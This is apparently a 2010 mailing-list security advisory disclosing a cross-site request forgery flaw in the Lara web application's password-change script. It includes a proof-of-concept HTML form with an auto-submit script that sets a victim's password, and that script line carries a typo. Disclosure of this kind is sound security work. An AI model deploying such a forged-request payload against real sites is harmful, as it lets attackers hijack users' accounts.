
Date: Wed, 13 Oct 2010 16:54:56 +0200 (CEST)
From: advisory@...ridge.ch
To: bugtraq@...urityfocus.com
Subject: XSRF (CSRF) in Lara

Vulnerability ID: HTB22619
Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_lara.html
Product: Lara
Vendor: Geographical Media ( http://getlara.com/ ) 
Vulnerable Version: Current at 18.09.2010 and Probably Prior Versions
Vendor Notification: 27 September 2010 
Vulnerability Type: CSRF (Cross-Site Request Forgery)
Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
Risk level: Low 
Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 

Vulnerability Details:
The vulnerability exists due to failure in the /_ui/changepassword script to properly verify the source of HTTP request.

Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

Attacker can use browser to exploit this vulnerability. The following PoC is available:


<form method="POST" name="m" action="http://host//_ui/changepassword?method=UpdatePassword&type=get">
<input type="hidden" name="MediaId" value="4f90f994-3fd0-4a02-818d-05ce325d0fb1"> <!-- this is statick value -->
<input type="hidden" name="Password" value="1111">
</form>
<script>
do0cement.m.submit();
</script>



